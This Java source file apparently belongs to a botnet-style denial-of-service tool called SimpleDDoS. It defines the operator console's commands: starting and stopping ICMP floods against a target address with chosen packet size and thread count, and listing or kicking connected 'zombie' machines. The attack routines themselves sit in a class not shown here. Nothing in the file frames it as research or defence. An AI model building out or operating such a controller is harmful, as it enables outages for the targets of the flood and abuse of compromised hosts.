package org.ddos.client;

import org.ddos.client.command.CommandActions;
import org.jcom.Command;
import org.jcom.CommandData;
import org.jcom.CommandInterface;
import org.jcom.CommandInterruptedException;
import org.jcom.FlagData;
import org.jcom.InvalidCommandArgumentsException;
import org.jcom.UnknownCommandException;

public class ClientCommands {
	private CommandInterface commands = new CommandInterface();

	public ClientCommands() {
		commands.putCommand("ddos",
				new CommandData("ddos [start|stop] <address> {-l size, -t threads}",
						"Starts or stops an attack on address.", 2,
						CommandActions.getDdosAction(), new FlagData("-l",
								"An integer which represents the byte size of each ICMP packet."),
				new FlagData("-t", "An integer which represents the amount of threads which will be pinging.")));
		commands.putCommand("dos",
				new CommandData("dos [start|stop] <address> {-l size, -t threads}",
						"Starts or stops an attack on address, where all pinging threads are ran on the local machine.",
						2,
						CommandActions.getDosAction(), new FlagData("-l",
								"An integer which represents the byte size of each ICMP packet."),
				new FlagData("-t", "An integer which represents the amount of threads which will be pinging.")));
		commands.putCommand("kick",
				new CommandData("kick",
						"Kicks all of the zombies from the server. They will all have to reconnect to the server.", 0,
						CommandActions.getKickAllZombiesAction()),
				new CommandData("kick <address...>",
						"Kicks all given zombies from the server. The zombies will have to reconnect to the server.",
						-1, CommandActions.getKickAction()));
		commands.putCommand("list",
				new CommandData("list", "Gets the IP addresses of all zombies connected to the server.", 0,
						CommandActions.getListZombiesAction()));
		commands.putCommand("help",
				new CommandData("help", "Lists all commands and their usage.", 0,
						CommandActions.getUniversalHelpAction()),
				new CommandData("help <command>", "Gets help for the specified command.", 1,
						CommandActions.getHelpForCommandAction()));
		commands.putCommand("wait",
				new CommandData("wait", "Waits until the user stops the command.", 0, CommandActions.getWaitAction()),
				new CommandData("wait <time>", "Waits for a given amount of milliseconds.", 1,
						CommandActions.getWaitForMillisecondsAction()));
		commands.putCommand("exit", new CommandData("exit", "Exits the SimpleDDoS client.", 0,
				CommandActions.getExitAction(), new FlagData("-k", "Kicks all of the zombies off of the server.")));
	}

	public void executeCommand(Command command)
			throws UnknownCommandException, InvalidCommandArgumentsException, CommandInterruptedException {
		commands.executeCommand(command);
	}

	public CommandData[] getCommandData(String baseCommand) throws UnknownCommandException {
		return commands.getCommandData(baseCommand);
	}
}
